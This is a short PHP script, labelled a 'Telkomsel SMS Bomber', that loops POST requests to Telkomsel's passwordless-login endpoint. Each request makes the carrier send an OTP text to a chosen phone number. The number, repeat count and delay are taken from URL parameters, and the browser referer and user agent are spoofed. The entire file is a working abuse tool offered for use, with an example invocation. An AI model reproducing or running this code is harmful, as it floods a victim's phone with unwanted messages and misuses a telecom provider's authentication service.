<?php
/*
* Coded by Dandy Raka ( https://github.com/dandyraka/TelkBomb )
* Telkomsel SMS Bomber
*/
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."<br>";
        sleep($wait);
        $x++;
    }
}

if (!empty($_GET['nomor']) AND !empty($_GET['jumlah']) AND !empty($_GET['delay'])) {
$nomor = $_GET['nomor'];
$jumlah = $_GET['jumlah'];
$delay = $_GET['delay'];

/*
* Example Execute : run.php?nomor=62822xxxxxxxx&jumlah=10&delay=2
* Updated 26-11-2017
*/

$execute = telkbomb($nomor, $jumlah, $delay);
print $execute;
} else {
    echo "Salah boss ...<br />";
    echo "Contohnya : run.php?nomor=62822xxxxxxxx&jumlah=10&delay=2";
}

?>
